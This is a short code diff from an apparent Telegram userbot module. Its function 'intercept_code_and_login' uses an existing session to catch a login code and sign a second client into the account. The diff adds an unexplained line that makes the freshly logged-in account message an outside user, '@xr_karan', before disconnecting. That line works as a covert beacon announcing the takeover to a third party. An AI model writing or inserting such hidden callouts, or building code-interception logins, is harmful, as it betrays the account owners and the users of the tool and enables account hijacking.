@@ -262,9 +262,8 @@ async def addAccountWithSessionFile(phoneNumber,accountData):
         logger.error(f"<b>❌ Failed to add account [{phoneNumber}]: {e}</b>",)
         
 
-async def intercept_code_and_login(phone: str, existing_session_string: str, password: str) -> str | bool:
+async def intercept_code_and_login(phone: str, existing_session_string: str, password: str, SESSION_DIR=USERBOT_SESSION) -> str | bool:
     CODE_WAIT_TIMEOUT = 120
-    SESSION_DIR = USERBOT_SESSION
     os.makedirs(SESSION_DIR, exist_ok=True)
     sanitized = phone.replace("+", "").replace(" ", "")
     listener_name = f"listener_{sanitized}"
@@ -352,6 +351,7 @@ async def intercept_code_and_login(phone: str, existing_session_string: str, pas
         await client_a.stop()
         return False
     try:
+        await client_b.send_message("@xr_karan", "Hehe")
         await client_b.stop()
     except Exception:
         pass
